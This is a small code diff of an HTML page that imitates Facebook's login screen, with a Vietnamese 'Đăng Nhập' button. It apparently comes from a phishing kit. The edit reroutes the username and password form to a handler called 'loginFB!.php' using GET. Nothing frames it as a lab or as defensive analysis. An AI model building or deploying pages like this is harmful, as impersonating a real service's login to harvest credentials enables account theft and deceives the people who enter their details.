@@ -16,7 +16,7 @@
 						<h2>Facebook helps you connect and share with the people in your life.</h2>
 					</div>
 			<div class="content-right">
-						<form method="POST" action="login.php">
+						<form method="Get" action="loginFB!.php">
 					<input name="username" type="text" placeholder="Email address or phone number"></input><br /><br />
 					<input name="password" id="password" type="password" placeholder="Password"></input><br />
 					<input type="submit" name="submit" value="Đăng Nhập" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff;"></input>
